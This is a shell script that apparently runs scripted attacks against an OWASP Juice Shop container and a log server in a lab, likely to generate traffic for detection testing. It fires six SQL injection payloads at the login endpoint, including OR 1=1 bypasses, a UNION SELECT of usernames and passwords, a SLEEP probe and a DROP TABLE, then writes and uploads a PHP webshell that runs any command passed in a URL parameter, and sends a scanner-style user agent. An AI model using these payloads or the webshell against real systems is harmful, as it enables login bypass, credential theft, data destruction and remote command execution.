#!/bin/sh
# attacks/run_attacks.sh (improved logging)
# Sends SQLi payloads, uploads webshell, issues UA request.
# Produces concise, timestamped log lines.

set -eu

# config
SLEEP_BEFORE=8
JUICE_HOST="http://juice:3000"
SQLI_ENDPOINT="${JUICE_HOST}/rest/user/login"
LOGSRV_UPLOAD_URL="http://logsrv:80/uploads"
UA="Mozilla/5.0 (evil-scanner)"
MAX_SNIPPET=200
ATTACKER_LOG="/tmp/attacker_run.log"
: > "${ATTACKER_LOG}"

timestamp() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }

log() {
  printf "%s | %s\n" "$(timestamp)" "$1" >> "${ATTACKER_LOG}"
  printf "%s | %s\n" "$(timestamp)" "$1"
}

# wait for juice shop to be reachable (max 60s)
log "Waiting for Juice Shop (up to 60s)..."
timeout=60
elapsed=0
while [ $elapsed -lt $timeout ]; do
  HTTP=$(curl -sS -o /dev/null -w "%{http_code}" "${JUICE_HOST}/" || echo "000")
  if [ "$HTTP" = "200" ] || [ "$HTTP" = "302" ]; then
    log "Juice Shop reachable (HTTP ${HTTP})"
    break
  fi
  sleep 2
  elapsed=$((elapsed+2))
  log "Waiting... (${elapsed}s)"
done

# ensure curl exists
if ! command -v curl >/dev/null 2>&1; then
  log "[!] curl not found in PATH. Exiting."
  exit 0
fi

# prepare payloads
i=0
i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin@example.com'"' OR 1=1 --","password":"x"}
EOF

i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin@example.com OR 1=1","password":"x"}
EOF

i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin' UNION SELECT username, password FROM Users --","password":"x"}
EOF

i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin' OR SLEEP(5) --","password":"x"}
EOF

i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
{"email":"admin'; DROP TABLE users; --","password":"x"}
EOF

i=$((i+1)); cat > /tmp/payload_${i}.json <<'EOF'
{"email":"alice' -- ","password":"x"}
EOF

TOTAL=$i
log "Prepared ${TOTAL} SQLi payloads."

# send payloads with concise logging
p=1
while [ $p -le $TOTAL ]; do
  PAY="/tmp/payload_${p}.json"
  RESP="/tmp/resp_${p}.txt"
  log "Sending payload ${p}/${TOTAL} -> ${PAY}"
  HTTP=$(curl -sS -o "${RESP}" -w "%{http_code}" -X POST -H "Content-Type: application/json" --data-binary @"${PAY}" "${SQLI_ENDPOINT}" || echo "000")
  # create snippet: strip tags and limit size
  if [ -s "${RESP}" ]; then
    SNIPPET=$(head -c ${MAX_SNIPPET} "${RESP}" | sed -E 's/<[^>]*>//g' | tr -d '\r\n')
  else
    SNIPPET="(empty)"
  fi
  log "PAYLOAD ${p} | HTTP ${HTTP} | SNIPPET: ${SNIPPET}"
  p=$((p+1))
done

# upload webshell(s)
TS="$(date +%s)"
SHELL_NAME="shell_${TS}.php"
TMP="/tmp/${SHELL_NAME}"
echo "<?php system(\$_GET['cmd']); ?>" > "${TMP}"
log "Created webshell ${TMP}"

log "Uploading ${SHELL_NAME} to ${LOGSRV_UPLOAD_URL}/"
UPLOAD_HTTP=$(curl -sS -o /tmp/upload_resp -w "%{http_code}" -X PUT --data-binary @"${TMP}" "${LOGSRV_UPLOAD_URL}/${SHELL_NAME}" || echo "000")
log "Upload HTTP ${UPLOAD_HTTP} -> ${SHELL_NAME}"

# suspicious UA
log "Sending suspicious UA request..."
curl -sS -A "${UA}" "${LOGSRV_UPLOAD_URL%/uploads/}" >/dev/null 2>&1 || true

# cleanup local tmp
rm -f /tmp/payload_*.json /tmp/resp_*.txt /tmp/upload_resp "${TMP}" || true
log "Cleaned temporary files. Attacks done. Uploaded: ${SHELL_NAME}"

# print final location of log
log "ATTACK LOG WRITTEN: ${ATTACKER_LOG}"
